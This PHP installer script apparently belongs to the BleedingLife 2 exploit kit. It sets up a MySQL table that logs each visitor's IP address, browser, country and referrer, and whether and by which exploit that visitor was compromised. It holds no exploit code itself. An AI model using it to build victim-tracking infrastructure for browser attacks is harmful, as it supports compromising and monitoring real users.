<?
/*
BleedingLife 2 - Exploit Test Lab
Copyright (C) 2011 Blackhat Academy

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/
	include_once('../config.php');
	include_once('../include/sql.php');
	include_once('../include/visitors.php');

	$sql = new CSQL($sqlSettings);
	$sql->open();
	
	createTables($sqlSettings);

	echo "Installation Complete.<br>";

	$sql->close();

	function createTables($sqlSettings)
		{
			$cq = new CQuery();
			echo("Creating Table " . $sqlSettings['tableVisitorsList'] . "<br>");
			
			$sql_result = mysql_query(" DROP TABLE IF EXISTS  `" . $sqlSettings['dbName'] . "`.`" . $sqlSettings['tableVisitorsList'] . "`");
			$sql_result = mysql_query("
				CREATE TABLE IF NOT EXISTS `" . $sqlSettings['dbName'] . "`.`" . $sqlSettings['tableVisitorsList'] . "` (
				`id` INT AUTO_INCREMENT ,
				`ipAddress` VARCHAR( 16 ),
				`userAgent` VARCHAR( 400 ),
				`country` VARCHAR( 400 ),
				`referrer` VARCHAR( 400 ),
				`exploited` BOOL,
				`exploit` VARCHAR( 400 ),				
				PRIMARY KEY ( `id` )
				) ENGINE = MYISAM ;");
						
			echo("Tables Created.<br>");
		}
	
?>
